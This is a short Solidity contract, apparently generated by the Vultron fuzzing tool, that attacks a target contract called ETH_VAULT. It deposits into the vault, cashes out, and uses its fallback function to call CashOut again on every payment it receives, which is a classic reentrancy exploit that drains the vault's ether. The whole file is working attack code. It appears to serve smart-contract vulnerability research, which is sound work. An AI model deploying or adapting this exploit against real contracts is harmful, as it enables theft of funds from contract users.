pragma solidity ^0.4.19;

import "/home/osboxes/vultron/contracts/ETH_VAULT.sol";

contract Attack_ETH_VAULT1 {

  ETH_VAULT public target_contract;

  function Attack_ETH_VAULT1(address _targetContract) public payable {
      target_contract = ETH_VAULT(_targetContract);
  } 

  function vultron_Deposit(uint256 vultron_amount) public payable{
    target_contract.Deposit.value(vultron_amount)();
  } 

  function vultron_CashOut(uint256 vultron_amount, uint256 _am) public payable{
    target_contract.CashOut.value(vultron_amount)(_am);
  } 

      function() public payable {
        
        target_contract.CashOut(10000);
      }
      } 
